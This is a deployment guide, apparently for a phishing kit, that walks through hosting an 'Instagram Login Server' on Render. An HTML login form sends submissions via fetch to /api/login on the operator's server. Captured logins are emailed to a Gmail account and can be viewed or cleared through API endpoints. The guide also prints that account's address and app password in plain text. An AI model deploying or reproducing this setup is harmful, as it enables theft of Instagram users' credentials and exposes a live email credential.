# Deploy to Render

This guide will help you deploy the Instagram Login Server to Render.

## Prerequisites

1. A GitHub account
2. A Render account (free tier available)
3. Your code pushed to a GitHub repository

## Step-by-Step Deployment

### 1. Push Code to GitHub

First, make sure your code is in a GitHub repository:

```bash
git add .
git commit -m "Add Python Flask server for deployment"
git push origin main
```

### 2. Deploy on Render

#### Option A: Using render.yaml (Recommended)

1. Go to [Render Dashboard](https://dashboard.render.com/)
2. Click "New +" and select "Blueprint"
3. Connect your GitHub repository
4. Render will automatically detect the `render.yaml` file
5. Click "Apply" to deploy

#### Option B: Manual Deployment

1. Go to [Render Dashboard](https://dashboard.render.com/)
2. Click "New +" and select "Web Service"
3. Connect your GitHub repository
4. Configure the service:
   - **Name**: `instagram-login-server`
   - **Environment**: `Python`
   - **Build Command**: `pip install -r requirements.txt`
   - **Start Command**: `python app.py`
5. Add Environment Variables:
   - `GMAIL_USER`: `waemsa19@gmail.com`
   - `GMAIL_PASS`: `mcci julh ypdy ngee`
6. Click "Create Web Service"

### 3. Update Your HTML File

After deployment, Render will provide a URL like:
`https://instagram-login-server.onrender.com`

Update your `index.html` file to use this URL:

```javascript
const response = await fetch('https://instagram-login-server.onrender.com/api/login', {
```

### 4. Test the Deployment

1. Open your HTML file in a browser
2. Try submitting the login form
3. Check the Render logs to see if requests are being received
4. Check your email for notifications

## Environment Variables

The following environment variables are configured in `render.yaml`:

- `GMAIL_USER`: Your Gmail address for notifications
- `GMAIL_PASS`: Your Gmail app password
- `PORT`: Automatically set by Render

## Monitoring

### View Logs
1. Go to your Render dashboard
2. Click on your service
3. Go to the "Logs" tab
4. Monitor real-time logs

### Check API Endpoints
- Login: `https://your-app-name.onrender.com/api/login`
- View Logs: `https://your-app-name.onrender.com/api/logs`
- Clear Logs: `https://your-app-name.onrender.com/api/clear-logs`

## Troubleshooting

### Common Issues

1. **Build Fails**
   - Check that `requirements.txt` is in the root directory
   - Verify all dependencies are listed

2. **Service Won't Start**
   - Check the logs in Render dashboard
   - Verify the start command is correct

3. **CORS Issues**
   - The app is configured to accept requests from any origin
   - If you still have issues, check the browser console

4. **Email Not Sending**
   - Verify Gmail credentials are correct
   - Check that you're using an App Password, not your regular password
   - Check Render logs for email errors

### Performance

- Free tier has limitations on requests per minute
- Consider upgrading if you expect high traffic
- Monitor usage in Render dashboard

## Security Notes

- Environment variables are encrypted in Render
- HTTPS is automatically enabled
- Consider adding rate limiting for production use
- Monitor logs regularly for suspicious activity

## Cost

- Free tier includes 750 hours per month
- Additional usage may incur charges
- Check Render pricing for current rates 